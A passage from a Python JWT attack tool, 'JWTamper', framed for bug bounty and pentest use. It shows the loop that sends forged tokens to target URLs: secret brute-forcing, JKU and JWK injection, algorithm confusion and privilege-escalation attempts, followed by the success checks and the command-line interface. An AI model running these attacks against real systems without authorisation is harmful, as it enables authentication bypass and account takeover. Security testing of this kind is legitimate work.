                    print(f"    [-] Skipping {module_name}: not applicable")
                    continue

                print(f"    [+] Running {module_name}...")

                if hasattr(module, 'set_custom_user') and custom_user:
                    module.set_custom_user(custom_user)

                if module_name == "jku_injection" and hasattr(args, 'jku_urls') and args and args.jku_urls:
                    jku_urls = [url.strip() for url in args.jku_urls.split(',')]
                    module.set_exploit_urls(jku_urls)

                if module_name == "algorithm_confusion" and hasattr(module, 'set_target_urls'):
                    module.set_target_urls(urls)

                if module_name == "weak_secret":
                    payload_count = 0

                    for attack_name, modified_token in module.generate_payloads(token):
                        payload_count += 1
                        status, length, response_time = self.request_handler.test_jwt(
                            url, modified_token, method
                        )

                        success = self._is_successful(original_status, status, original_length, length)

                        result = TestResult(
                            module_name=module_name,
                            attack_name=attack_name,
                            original_token=token_str,
                            modified_token=modified_token,
                            url=url,
                            success=success,
                            status_code=status,
                            response_length=length,
                            response_time=response_time
                        )

                        results.append(result)

                        if success:
                            print(f"      [!] {attack_name}: {status} (SUCCESS)")
                            print(f"      [!] SECRET CRACKED! Stopping after {payload_count} attempts.")
                            break
                        else:
                            print(f"      [x] {attack_name}: {status}")

                    print(f"      [-] Brute force complete ({payload_count} attempts)")

                else:
                    for attack_name, modified_token in module.generate_payloads(token):
                        status, length, response_time = self.request_handler.test_jwt(
                            url, modified_token, method
                        )

                        success = self._is_successful(original_status, status, original_length, length)

                        result = TestResult(
                            module_name=module_name,
                            attack_name=attack_name,
                            original_token=token_str,
                            modified_token=modified_token,
                            url=url,
                            success=success,
                            status_code=status,
                            response_length=length,
                            response_time=response_time
                        )

                        results.append(result)

                        if success:
                            print(f"      [!] {attack_name}: {status} (SUCCESS)")
                        else:
                            print(f"      [x] {attack_name}: {status}")

        return results

    def _is_successful(self, original_status: int, new_status: int,
                      original_length: int, new_length: int) -> bool:

        if original_status == 0:
            return False

        if original_status in [401, 403] and new_status == 200:
            return True

        if original_status == 200 and new_status == 200:
            if abs(new_length - original_length) > 100:
                return True

        if original_status >= 400 and 200 <= new_status < 300:
            return True

        if original_status in [401, 403] and new_status in [302, 301]:
            return True

        if original_status == 401 and new_status == 403:
            return True

        if original_status in [401, 403] and new_status == 500:
            return True

        return False

    def print_results(self, results: List[TestResult]):
        successful = [r for r in results if r.success]

        print(f"\n{'='*60}")
        print(f"RESULTS SUMMARY")
        print(f"{'='*60}")
        print(f"Total tests: {len(results)}")
        print(f"Successful attacks: {len(successful)}")

        if successful:
            print(f"\n[!] CRITICAL FINDINGS:")
            for result in successful:
                print(f"  [!] {result.attack_name} on {result.url}")
                print(f"      Status: {result.status_code}, Length: {result.response_length}")
                print(f"      Modified Token: {result.modified_token}")
                print()

# ============================================================================
# CLI Interface
# ============================================================================

def main():
    print_banner()

    if not CRYPTO_AVAILABLE:
        print("[!] Enhanced features require the cryptography library")
        print("    Install with: pip install cryptography")
        print("    Some modules (like JWK injection) will be limited without it")
        print()

    parser = argparse.ArgumentParser(description='JWTamper - Automated JWT Testing For Bug Bounty Hunters and Pentesters')
    parser.add_argument('--token', help='JWT token to test (required for testing, not for utility functions)')
    parser.add_argument('--url', help='Single URL to test')
    parser.add_argument('--urls-file', help='File containing URLs to test (one per line)')
    parser.add_argument('--modules', help='Comma-separated list of modules to use')
    parser.add_argument('--method', default='GET', help='HTTP method to use (default: GET)')
    parser.add_argument('--custom-user', help='Custom username to test for privilege escalation (e.g., john.smith)')
    parser.add_argument('--jku-urls', help='Comma-separated list of JKU URLs to test (for jku_injection module)')
    parser.add_argument('--print-jwk-set', action='store_true', help='Generate and print JWK Set for exploit server')
    parser.add_argument('--list-modules', action='store_true', help='List available modules')

    args = parser.parse_args()

    tamper = JWTamper()

    if args.print_jwk_set:
        jku_module = tamper.modules.get('jku_injection')
        if jku_module:
            jku_module.print_jwk_set()
        else:
            print("[x] JKU injection module not found in registered modules")
            print(f"[DEBUG] Available modules: {list(tamper.modules.keys())}")
        return

    if args.list_modules:
        print("[+] Available modules:")
        for module_name in tamper.list_modules():
            module = tamper.modules[module_name]
            crypto_req = " (requires cryptography)" if module_name in ["jwk_injection", "jku_injection"] and not CRYPTO_AVAILABLE else ""
            print(f"    {module_name}: {module.description}{crypto_req}")
        return

    if not args.token:
        print("[x] Error: --token is required for testing operations")
        print("    Use --list-modules or --print-jwk-set for utility functions")
        return

    urls = []
    if args.url:
        urls.append(args.url)
    if args.urls_file:
        try:
            with open(args.urls_file, 'r') as f:
                urls.extend([line.strip() for line in f if line.strip()])
        except FileNotFoundError:
            print(f"[x] Error: URLs file '{args.urls_file}' not found")
            return

    if not urls:
        print("[x] Error: No URLs specified. Use --url or --urls-file")
        return

    modules = None
    if args.modules:
        modules = [m.strip() for m in args.modules.split(',')]

    results = tamper.test_token(args.token, urls, modules, args.method, getattr(args, 'custom_user', None), args)
    tamper.print_results(results)

if __name__ == '__main__':
    main()
